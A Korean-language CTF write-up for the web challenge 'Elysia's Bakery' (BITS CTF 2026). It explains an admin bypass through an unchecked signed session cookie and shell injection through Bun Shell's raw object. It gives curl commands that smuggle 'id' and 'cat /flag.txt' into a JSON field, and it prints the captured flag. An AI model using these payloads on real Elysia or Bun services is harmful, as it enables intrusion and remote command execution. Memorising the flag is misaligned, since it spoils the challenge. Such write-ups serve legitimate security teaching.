---
title: "[Web] Elysia's Bakery"
description: Writeup for "Elysia's Bakery" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Elysia's Bakery (BITS CTF 2026)

---

- **Name:** Elysia's Bakery
- **Category:** Web
- **Description:** Becoming admin shouldn't be too hard?
- **Connection:** `http://chals.bitskrieg.in:32274`
- **Flag format:** `BITSCTF{...}`

---

### 개요

문제 설명이 힌트를 노골적으로 줍니다.

> "Becoming admin shouldn't be too hard?"

어드민이 되는 것이 쉬워야 한다는 뜻입니다.
어드민 세션을 얻고, 어드민 전용 기능을 악용해 플래그를 읽는 두 단계로 구성됩니다.

눈에 띄는 엔드포인트는 하나입니다.

| 엔드포인트 | 설명 |
|---|---|
| `POST /admin/list` | 폴더 내용을 반환하는 어드민 전용 기능 |

`folder` 값을 받아서 파일 목록을 돌려주는 구조입니다.
여기서 두 가지를 의심해볼 수 있습니다.

- 어드민 인증을 어떻게 우회할 수 있는가
- `folder` 값이 셸 명령으로 넘어가는가

둘 다 취약했습니다.

---

### 소스 분석

#### 세션 쿠키 처리 — 서명 검증 버그

서버는 서명된 `session` 쿠키로 사용자를 식별합니다.
정상적으로라면, 서명 없이 `session=admin`만 보내면 거부되어야 합니다.

그런데 이 버전의 Elysia에는 `cookie.secrets` 배열과
`cookie.sign` 설정이 맞물리는 부분에 버그가 있습니다.

```ts
// Elysia 쿠키 설정 (취약한 버전)
app.use(cookie({
  secrets: ["secret"],
  sign: ["session"]
}))
```

서명 검증에 실패해도 서버가 **그 실패를 조용히 무시**하고
쿠키 값을 그대로 신뢰합니다.

결과적으로 서명된 쿠키가 **서명 없는 쿠키**처럼 동작합니다.
`Cookie: session=admin`만 보내도 어드민으로 인식됩니다.

#### /admin/list — Bun Shell 명령 실행

어드민 엔드포인트 내부를 보면 이렇게 되어 있습니다.

```ts
const result = await $`ls ${folder}`.quiet();
```

Bun Shell의 템플릿 리터럴은 `${}` 안의 값을 기본적으로 **이스케이프**합니다.
일반 문자열을 넣으면 셸 인젝션이 안 됩니다.

그런데 Bun Shell에는 특별한 객체 형식이 있습니다.

```ts
$`ls ${{ raw: ">/dev/null && cat /flag.txt" }}`
// → ls >/dev/null && cat /flag.txt
```

`{"raw": "..."}` 형태의 객체를 넘기면 이스케이프를 **완전히 건너뜁니다.**
값이 그대로 셸 명령에 삽입됩니다.

#### 입력 검증 — 타입 검사 허점

서버의 입력 검증 코드를 보면 이렇게 되어 있습니다.

```ts
if (typeof folder === "string" && folder.includes("..")) {
  return error(400, "Invalid folder");
}
```

`folder`가 **문자열일 때만** 검사합니다.
객체를 넘기면 `typeof folder === "string"`이 `false`가 되어
검증 블록 자체를 건너뜁니다.

`{"raw": "..."}` 객체는 문자열이 아니므로 필터를 그냥 통과합니다.

---

### 취약점 분석

세 가지가 맞물립니다.

**1. Elysia 서명 쿠키 검증 버그:**
서명 실패가 무시되어 `session=admin` 쿠키만으로 어드민 세션이 됩니다.

**2. Bun Shell `raw` 객체로 이스케이프 우회:**
`{"raw": "..."}` 객체를 넘기면 값이 그대로 셸에 삽입됩니다.

**3. 타입 검사만 하는 필터:**
`typeof folder === "string"` 조건 때문에 객체는 검증을 통과합니다.

페이로드를 조합하면 이렇게 됩니다.

```
folder = {"raw": ">/dev/null && cat /flag.txt"}

→ Bun Shell 실행: ls >/dev/null && cat /flag.txt
→ ls 출력은 /dev/null로 버리고
→ cat /flag.txt 결과만 응답에 포함
```

---

### Exploit 실행 과정

**Step 1 — 어드민 인증 우회 확인**

```bash
curl -s -X POST "http://chals.bitskrieg.in:32274/admin/list" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=admin" \
  --data '{"folder":"."}'
```

200 응답에 파일 목록이 나오면 인증 우회 성공입니다.

**Step 2 — RCE 확인**

```bash
curl -s -X POST "http://chals.bitskrieg.in:32274/admin/list" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=admin" \
  --data '{"folder":{"raw":">/dev/null && id"}}'
```

응답에 `uid=...` 형태의 `id` 출력이 포함되면 RCE가 동작하는 것입니다.

**Step 3 — 플래그 읽기**

```bash
curl -s -X POST "http://chals.bitskrieg.in:32274/admin/list" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=admin" \
  --data '{"folder":{"raw":">/dev/null && cat /flag.txt"}}' \
| grep -o 'BITSCTF{[^}]*}'
```

실행 결과:

```
BITSCTF{dc10bd7ec1d0dacaf5ca3022aa80b058}
```

---

### FLAG

```
BITSCTF{dc10bd7ec1d0dacaf5ca3022aa80b058}
```

---

### 요약

이 문제의 핵심은 **두 버그의 체이닝**입니다.

Elysia의 서명 쿠키 검증 버그로 인증을 건너뛰고,
Bun Shell의 `raw` 객체로 이스케이프를 무력화합니다.
거기에 타입만 검사하는 필터가 객체를 그냥 통과시키면서
세 조건이 맞물려 RCE까지 도달합니다.

프레임워크나 런타임의 특수 객체 형식(`raw` 등)은
개발자가 의도하지 않은 방식으로 사용될 수 있습니다.
사용자 입력을 셸에 넘기기 전에 타입과 값을 모두 검증해야 합니다.
